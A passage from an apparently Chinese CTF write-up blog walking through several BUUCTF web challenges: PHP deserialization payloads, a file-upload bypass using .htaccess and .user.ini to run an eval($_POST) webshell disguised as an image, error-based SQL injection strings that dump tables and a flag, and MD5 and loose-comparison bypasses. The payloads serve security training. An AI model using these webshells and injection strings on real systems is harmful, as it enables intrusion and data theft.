class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>运行上面代码拿到序列化后的字符串: 这也就是参数<code>password</code>所需的值</p>
<img src="/images/buuctf-web/image-20221016231639955.png" alt="image-20221016231639955" style="zoom:67%;" />

<p>最后构造最终的<code>payload</code>: 别忘了利用<code>file</code>参数来包含<code>useless.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码得到flag:</p>
<img src="/images/buuctf-web/image-20221016231844331-166704781973570.png" alt="image-20221016231844331" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>一进来被臭到了</p>
<img src="/images/buuctf-web/image-20221017113107172-166704781973571.png" alt="image-20221017113107172" style="zoom:67%;" />

<p>试试传文件有哪些限制, 这里直接传php一句话木马,然后抓包把扩展名和<code>Content-Type</code>字段改一下就能够传成功</p>
<img src="/images/buuctf-web/image-20221017105933409.png" alt="image-20221017105933409" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  mkdir(): File exists in &lt;b&gt;/var/www/html/upload.php&lt;/b&gt; on line &lt;b&gt;23&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">/var/www/html/upload/c254d40d92f59c4fed06e9c1938ddd84/one_sentence.png succesfully uploaded!</span><br></pre></td></tr></table></figure>

<p>但是这样传上去之后,使用菜刀或者蚁剑会连接失败</p>
<img src="/images/buuctf-web/image-20221017111421512-166704781973573.png" alt="image-20221017111421512" style="zoom:50%;" />



<h2 id="利用-htaccess文件"><a href="#利用-htaccess文件" class="headerlink" title="利用.htaccess文件"></a>利用<code>.htaccess</code>文件</h2><p>**这里测试了一下,<code>.htaccess</code>文件也是可以传的,那么可以通过此文件改变当前目录下文件的扩展名: **参考<a href="aeaad0f.html">Apache的文件解析漏洞</a></p>
<p><code>.htaccess</code>: 这里可以让服务器把<code>.htaccess</code>同目录下的<code>a.png</code>当作<code>php</code>文件来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;a.png&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221017112731883.png" alt="image-20221017112731883" style="zoom:80%;" />

<p>接下来传一个命名为<code>a.png</code>的一句话木马就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/632e7c4669947e64e5607856061b2c07/a.png succesfully uploaded!</span><br></pre></td></tr></table></figure>

<p>成功连接并找到flag:</p>
<img src="/images/buuctf-web/image-20221017113009623-166704781973572.png" alt="image-20221017113009623" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h2><p>这里考察基于报错的注入,原理具体见<a href="94662ad7.html">SQL注入</a></p>
<p>这里很多字符都被过滤了,包括空格,所以需要加空格的地方使用括号来代替.  等于号被代替了,所以下面需要等于号的地方用<code>like</code>模糊查询来代替</p>
<p>爆库名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">admin&#x27;^extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~geek~&#x27;</span><br></pre></td></tr></table></figure>

<p>爆表名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;))),0x7e),1))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~H4rDsq1~&#x27;</span><br></pre></td></tr></table></figure>

<p>爆列名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;))),0x7e),1))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>

<p>爆数据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span><br><span class="line">username输入:</span><br><span class="line">输出:XPATH syntax error: &#x27;~flag&#123;2051cec7-0336-41ed-b551-9f&#x27;</span><br></pre></td></tr></table></figure>

<p>注意到这里只输出了一半的flag,使用<code>right</code>函数来从后往前输出20位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1)),0x7e),1))#</span><br><span class="line">username输入:</span><br><span class="line">输出:XPATH syntax error: &#x27;~d-b551-9f49d0135390&#125;~&#x27;</span><br><span class="line">flag&#123;2051cec7-0336-41ed-b551-9f49d0135390&#125;</span><br></pre></td></tr></table></figure>

<p>两次的结果拼接成完整的flag</p>
<br>

<hr>
<br>

<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>源码里找到有缩进的源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//I put something in F12 for you include &#x27;flag.php&#x27;;Please input first</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>)&amp;&amp;<span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一步,<code>id</code>和<code>gg</code>值不相等,但是<code>md5</code>计算结果相等, 数组绕过:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]=1&amp;gg[]=2</span><br></pre></td></tr></table></figure>

<p>第二步,POST传<code>passwd</code>参数,要求等于1234567,还要是字符串,那么传数字加字母就行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="利用-user-ini"><a href="#利用-user-ini" class="headerlink" title="利用.user.ini"></a>利用<code>.user.ini</code></h2><p>这里的上传对文件内容进行检测,例如php文件中的<code>&lt;?</code>就会被过滤掉, 同时还会检测是否上传的是图片:</p>
<p>因此使用<code>GIF89</code>+<code>script</code>的形式进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上述文件命名为<code>scri.jpg</code>,能够成功上传</p>
<p>接下来需要解决怎样让上传的图片马在服务器端执行的问题, <strong>这里尝试上传<code>.htaccess</code>文件,不起作用</strong></p>
<p>另外一种方法是上传<code>.user.ini</code>文件:</p>
<blockquote>
<p><code>.user.ini</code>实际上就是一个可以由用户自定义的<code>php.ini</code>配置文件，我们能够自定义的设置是模式为“<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>”的设置。<br>它比<code>.htaccess</code>(分布式配置文件)用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<code>fastcgi</code>(进程管理器)运行的php都可以用这个方法。</p>
<p>其中有两项可以为我们所用:</p>
<ul>
<li><p><code>auto_prepend_file</code>指定一个文件，自动<strong>包含在要执行的文件前</strong>，类似于在文件前调用了<code>require()</code>函数。</p>
</li>
<li><p><code>auto_append_file</code>类似，只是<strong>在文件后面包含</strong>。</p>
</li>
</ul>
<p><strong>例如如果同目录下有<code>.user.ini</code>,其内容为:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;auto_prepend_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<p><strong>那么在执行同目录下的<code>index.php</code>(或者其他php文件)时,就会先自动地对<code>1.jpg</code>进行包含</strong></p>
</blockquote>
<p>那么这里就可以准备一个<code>.user.ini</code>,其内容为: 这里前面加GIF是为了绕过<code>exif_imagetype</code>对文件内容的检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=&quot;scri.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>将此文件上传:</p>
<img src="/images/buuctf-web/image-20221017162117205-166704781973574.png" alt="image-20221017162117205" style="zoom:67%;" />



<p><strong>这里注意到同目录下有个<code>index.php</code>,那么现在如果运行<code>index.php</code>就会自动包含<code>scri.jpg</code></strong></p>
<p>那么现在可以使用蚁剑来连接<code>index.php</code>了: 连接上后在根目录找到flag.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d0916e13-9c97-47a1-a8f5-495883e6157f.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure>

<p>另一种方法: 直接通过命令执行来找到flag:</p>
<img src="/images/buuctf-web/image-20221017162341878-166704781973575.png" alt="image-20221017162341878" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>反序列化题目, 给代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content); <span class="comment">//把字符串写入文件中</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// op属性值为2的时候,才会从process处调用此方法. 但问题是调用process方法是在__construct和__destruct中</span></span><br><span class="line"><span class="comment">// 在__destruct,如果检测到op的值为2,则会将其变为1,这样后面调用process()时就无法达到读取文件的目的了</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//需要利用此函数来读取文件,flag.php. filename属性存储文件名</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>)) <span class="comment">//返回ascii码值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123; </span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;  <span class="comment">//str参数的每个字符必须在is_valid限制的ascii码范围之内</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到本地来运行,注意这里的<code>protected</code>属性无法在类外面给其赋值,遂直接在类内部赋值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化的结果:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>但这里问题就来了,对于<code>private</code>和<code>protected</code>的属性,在反序列化时需要在相应的类名或者<code>*</code>两侧加上<code>%00</code>,但是本题的代码中,<code>%00</code>并不在<code>is_valid</code>函数允许的范围里</p>
<p><strong>这里服务器的版本是PHP7.4.3,对修饰符不敏感,因此直接改成<code>public</code>就行</strong></p>
<p>另外, 我们需要在反序列化后通过自动调用的<code>__destruct()</code>函数来调用<code>process()</code>,然后再调用<code>read</code>来达到读取<code>flag.php</code>的目的</p>
<p>但是<code>__destruct()</code>函数如果检测到<code>op</code>的值为2,会将其变为1</p>
<p>但是注意到<code>__destruct()</code>中用的是<code>===</code>强比较,会检测数据的类型, 而在<code>process()</code>中用的是弱比较,只检测值,所以传数值型的<code>op</code>就可以绕过<code>__destruct()</code>中的判断了</p>
<p>修改后的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>那么payload: (如果直接在浏览器的url框里输入的话,还需要手动进行一次url编码)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://92545990-4fc0-4d2e-b817-e5ac4b33b072.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码得到flag</p>
